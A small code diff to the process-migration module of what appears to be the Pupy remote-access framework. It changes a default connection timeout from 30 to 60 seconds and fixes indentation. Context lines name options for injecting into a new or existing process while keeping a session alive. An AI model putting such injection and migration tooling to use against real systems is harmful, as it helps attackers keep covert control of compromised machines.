@@ -28,7 +28,7 @@ class MigrateModule(PupyModule):
                             help='create a new process and inject into it')
         group.add_argument('pid', nargs='?', type=int, help='pid')
         self.arg_parser.add_argument('-k', '--keep', action='store_true' ,help='migrate into the process but create a new session and keep the current pupy session running')
-	self.arg_parser.add_argument('-t', '--timeout', type=int, default=30, help='time in seconds to wait for the connection')
+        self.arg_parser.add_argument('-t', '--timeout', type=int, default=60, help='time in seconds to wait for the connection')
 
     def run(self, args):
         if self.client.is_windows():
